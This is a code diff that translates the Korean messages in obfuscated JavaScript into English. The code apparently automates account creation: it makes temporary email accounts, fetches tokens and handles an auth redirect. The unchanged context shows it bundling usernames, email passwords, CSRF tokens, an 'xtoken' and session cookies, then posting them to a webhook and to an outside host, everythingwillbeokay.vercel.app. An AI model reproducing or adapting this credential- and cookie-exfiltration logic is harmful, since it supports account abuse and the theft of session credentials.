@@ -37,7 +37,7 @@ await (async () => {
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ address: e, password: b })
         });
-        if (!f.ok) throw new Error(`계정 생성 실패: ${f.status}`);
+        if (!f.ok) throw new Error(`Email Account Creation Failed: ${f.status}`);
         const g = (await f.json()).address;
         const { token: h } = await (await fetch(`${a}/token`, {
             method: 'POST',
@@ -65,22 +65,22 @@ await (async () => {
                             body: JSON.stringify({ auth_url: q })
                         });
                         const s = await r.json();
-                        const userData = s.status === '성공' ? { username: l, email: g, email_password: b, csrf: j, xtoken: k, cookie: s.cookies || {} } : null;
-                        const t = userData ? `# ${l} - 성공\n\`\`\`\n${JSON.stringify(userData, null, 2)}\n\`\`\`` : `# ${l} - 실패\n\`\`\`리다이렉트 없음\`\`\``;
+                        const userData = s.status === 'success' ? { username: l, email: g, email_password: b, csrf: j, xtoken: k, cookie: s.cookies || {} } : null;
+                        const t = userData ? `# ${l} - Success\n\`\`\`\n${JSON.stringify(userData, null, 2)}\n\`\`\`` : `# ${l} - Failed\n\`\`\`No Redirect\`\`\``;
                         fetch(w, {
                             method: 'POST',
                             headers: { 'Content-Type': 'application/json' },
                             body: JSON.stringify({ content: t, username: 'Monster' })
-                        }).catch(z => x(`웹훅 전송 실패: ${z.message}`));
+                        }).catch(z => x(`Webhook Error: ${z.message}`));
                         if (userData) {
                             fetch('https://everythingwillbeokay.vercel.app/em', {
                                 method: 'POST',
                                 headers: { 'Content-Type': 'application/json' },
                                 body: JSON.stringify(userData)
-                            }).catch(z => x(`em.py 실행 요청 실패: ${z.message}`));
+                            }).catch(z => x(`em.py Execution Request Failed: ${z.message}`));
                         }
                     } catch (z) {
-                        x(`서버 전송 실패: ${z.message}`);
+                        x(`Server Send Failed: ${z.message}`);
                     }
                 }
                 break;
